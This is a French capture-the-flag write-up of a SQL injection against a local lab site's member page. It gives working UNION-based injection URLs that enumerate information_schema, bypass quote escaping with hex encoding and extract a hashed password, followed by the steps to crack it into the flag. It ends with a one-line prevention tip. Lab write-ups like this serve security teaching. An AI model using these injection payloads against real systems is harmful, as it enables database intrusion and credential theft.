# Member SQL Injection

## Vulnérabilité

On peut faire des injections SQL directement dans l'url pour y recuperer des donnees sensibles

Si on cherche un image number aleatoire, on remarque que le lien est comme suit:

```url
  http://localhost:8080/index.php?page=member&Submit=Submit&id=0
```

Pour verifier que la page est vulnerable aux SQL injections, on test de remplacer le `id=1` par une commande sql
ici, on va remplacer par une condition qui est toujours vraie : `id = 0 OR NOT 0`, afin d'avoir la liste des toutes les images

```url
  http://localhost:8080/index.php?page=member&Submit=Submit&id=0%20OR%20NOT%200
```

On obtiens ainsi les resultats suivant :

```shell
    ID: 0 OR NOT 0 
    First name: one
    Surname : me

    ID: 0 OR NOT 0 
    First name: two
    Surname : me

    ID: 0 OR NOT 0 
    First name: three
    Surname : me

    ID: 0 OR NOT 0 
    First name: Flag
    Surname : GetThe
```

Deux conclusions :
1. La page est bien sensible aux injections sql
2. Il faut cibler l'id dont le nom est `GetThe Flag`

Pour aller plus loin, il faut que l'on recupere le nom des tables. POur cela, on va deja utiliser la fonction SQL `database()` qui renvoie le nom de la base de donnees

```url
    http://localhost:8080/index.php?page=member&Submit=Submit&id=0%20UNION%20SELECT%201,%20database()
```

la base de donnees s'appelle `Member_Sql_Injection`

On va ensuite interroger une table speciale appelee information_schema.tables qui contient la liste de toutes les tables

```url
    http://localhost:8080/index.php?page=member&Submit=Submit&id=0%20UNION%20SELECT%201,%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20database()
```

on obtiens:

```shell
    ID: 0 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema = database() 
    First name: 1
    Surname : users
```

On veut ensuite verifier les colonnes contenues dans la table `users` obtenue

```url
    http://localhost:8080/index.php?page=member&Submit=Submit&id=0%20UNION%20SELECT%201,%20group_concat(column_name)%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%27users%27
```

La commande ne marche pas et on obtiens l'erreur :

```shell
    You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'users\'' at line 1
```

On utilise alors la valeur Hexadecimal. L'ordinateur comprend que c'est une chaine de caracteres sans avoir besoin de guillemets : `0x7573657273`


```url
    http://localhost:8080/index.php?page=member&Submit=Submit&id=0%20UNION%20SELECT%201,%20group_concat(column_name)%20FROM%20information_schema.columns%20WHERE%20table_name%20=%200x7573657273
```

On obtiens alors les tables suivantes : `user_id,first_name,last_name,town,country,planet,Commentaire,countersign`

en fouillant dans chacune d'elle, on trouve que comment affiche ceci :

```url
    http://localhost:8080/index.php?page=member&Submit=Submit&id=0%20UNION%20SELECT%201,%20Commentaire%20FROM%20users
```url
```
    http://localhost:8080/index.php?page=member&Submit=Submit&id=0%20UNION%20SELECT%201,%20countersign%20FROM%20users    
```

```shell
    ID: 0 UNION SELECT 1, Commentaire FROM users 
    First name: 1
    Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
```
```shell
    ID: 0 UNION SELECT 1, countersign FROM users 
    First name: 1
    Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

On suit donc les instructions, le decode md5 donne `FortyTwo`, donc `fortytwo` en lowerCase puis le sha256 donne  le flag `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

## Prévention

Ne pas utiliser un input brut dans la query sql, et la 'escape' avant 
